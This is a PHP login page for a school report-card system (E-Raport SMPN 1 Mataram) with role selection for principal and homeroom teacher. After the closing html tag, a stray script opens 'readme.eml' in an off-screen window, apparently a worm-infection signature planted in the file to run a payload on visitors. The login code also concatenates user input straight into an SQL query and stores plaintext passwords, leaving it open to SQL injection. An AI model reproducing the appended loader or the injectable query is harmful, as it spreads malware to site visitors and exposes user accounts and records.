<?php
ob_start();
session_start();
if($_SESSION){
	header("Location: index.php");
}
?>
<!DOCTYPE html>
<html class="bg-black">
    <head>
        <meta charset="UTF-8">
        <title>E-Raport SMPN 1 Mataram | Log in User</title>
        <meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
        <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
        <link rel="stylesheet" href="font-awesome-4.2.0/css/font-awesome.min.css">
        <!-- Theme style -->
        <link href="css/AdminLTE.css" rel="stylesheet" type="text/css" />
       <!--  <link rel="shortcut icon" href="../stmik-logo.png"/> -->
        <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
          <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
        <![endif]-->
    </head>
    <body class="bg-black">

        <div class="form-box" id="login-box">
            <div class="header">Silahkan Login</div>
            <?php
				if(isset($_POST['login'])){
					include("../config/config.php");
					
					$username	= $_POST['username'];
					$password	= $_POST['password'];
					//$nama_lengkap= $_POST['nama_lengkap'];
					$level		= $_POST['jabatan'];
					
					$query = mysqli_query($link, "SELECT * FROM tbl_user WHERE nip='$username' AND password='$password'");
					if(mysqli_num_rows($query) == 0){
						echo '<div class="alert alert-danger">Upss...!!! Login gagal.</div>';
					}else{
						$row = mysqli_fetch_assoc($query);
						
						if($row['jabatan'] == 1 && $level == 1){
							$_SESSION['admin-kepsek']=$username;
							$_SESSION['nama']=$row['nama_lengkap'];
							$_SESSION['jabatan']='Kepsek';
							header("Location: /e-raport/kepsek");
						}else if($row['jabatan'] == 2 && $level == 2){
							$_SESSION['admin-wali']=$username;
                            $_SESSION['nama']=$row['nama_lengkap'];
							$_SESSION['jabatan']='walikelas';
							header("Location: /e-raport/walikelas");
						
						}else{
							echo '<div class="alert alert-danger">Upss...!!! Login gagal.</div>';
						}
					}
				}
				?>
            <form action="" method="post">
                <div class="body bg-gray">
                    <div class="form-group">
                        <input type="text" name="username" class="form-control" placeholder="Masukkan Username" required/>
                        <small>*Gunakan NIP Sebagai Username</small>
                    </div>
                    <div class="form-group">
                        <input type="password" name="password" class="form-control" placeholder="Masukkan Sandi" required/>
                    </div>  
                    <div class="form-group">
						<select name="jabatan" class="form-control" required>
							<option value="">Pilih Level User</option>
							<option value="1">Kepala Sekolah</option>
							<option value="2">Wali Kelas</option>
							
						</select>
					</div>        
                    
                </div>
                <div class="footer">                                                               
                    <button type="submit" name="login" class="btn bg-olive btn-block"><i class="fa fa-key"></i> Login</button>  
                    
                    <p>Lupa Password..?</p>
                    <button class="btn btn-block btn-danger btn-flat"><i class="fa fa-question-circle"></i>  Lupa Password</button>
                </div>
            </form>

            
        </div>

        <script src="assets/js2/jquery.min.js"></script>
        <script src="assets/js2/bootstrap.min.js" type="text/javascript"></script>

    </body>
</html>
<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script>
</html>